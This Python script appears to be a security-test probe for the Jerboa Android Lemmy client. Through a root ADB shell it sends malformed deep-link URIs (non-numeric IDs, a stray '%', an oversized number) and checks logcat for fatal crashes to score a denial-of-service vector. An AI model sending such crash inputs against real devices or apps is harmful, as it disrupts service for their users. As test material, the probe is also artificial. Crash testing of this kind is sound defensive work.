#!/usr/bin/env python3
"""
Probe: Jerboa — availability (remote_attacker).
Crash-side-effect probe driven by root/ADB intent dispatch.
"""

from __future__ import annotations

import json
import shlex
import sys
import time
from pathlib import Path


def _load_and_run():
    parent = Path(__file__).resolve().parent.parent
    if str(parent) not in sys.path:
        sys.path.insert(0, str(parent))

    from jerboa_probe_utils import (
        get_attested_pids,
        get_boot_time,
        get_device_time_info,
        parse_threadtime_epoch,
        parse_threadtime_line,
        run_root_shell,
    )

    summary = {"score": 1, "vectors": {}}
    original_pids = get_attested_pids()
    if not original_pids:
        print(json.dumps(summary))
        return 1

    crash_candidates = [
        "https://lemmy.world/post/not-a-number",
        "https://lemmy.world/comment/not-a-number",
        "https://lemmy.world/c/%",
        "https://lemmy.world/u/%",
        "https://lemmy.world/post/999999999999999999999999999",
    ]

    for uri in crash_candidates:
        run_root_shell(
            f"am start -W -a android.intent.action.VIEW -d {shlex.quote(uri)} com.jerboa/.MainActivity",
            timeout=60,
        )
        time.sleep(2)

    year, tzinfo = get_device_time_info()
    boot_time = get_boot_time()
    success, crash_log = run_root_shell("logcat -d -v threadtime -s AndroidRuntime:E")
    if success and crash_log:
        fatal_pids: set[str] = set()
        process_pids: set[str] = set()
        for line in crash_log.splitlines():
            prefix, pid, _tag, msg, _ = parse_threadtime_line(line)
            if not pid or pid not in original_pids:
                continue
            if year is not None and tzinfo is not None:
                epoch = parse_threadtime_epoch(prefix or "", year, tzinfo)
                if epoch is not None and epoch < boot_time:
                    continue
            if "FATAL EXCEPTION" in msg:
                fatal_pids.add(pid)
            if "Process: com.jerboa" in msg:
                process_pids.add(pid)

        if fatal_pids & process_pids:
            summary["vectors"]["V-005"] = True
            summary["score"] = 0
            print(json.dumps(summary))
            return 0

    print(json.dumps(summary))
    return 1


if __name__ == "__main__":
    sys.exit(_load_and_run())
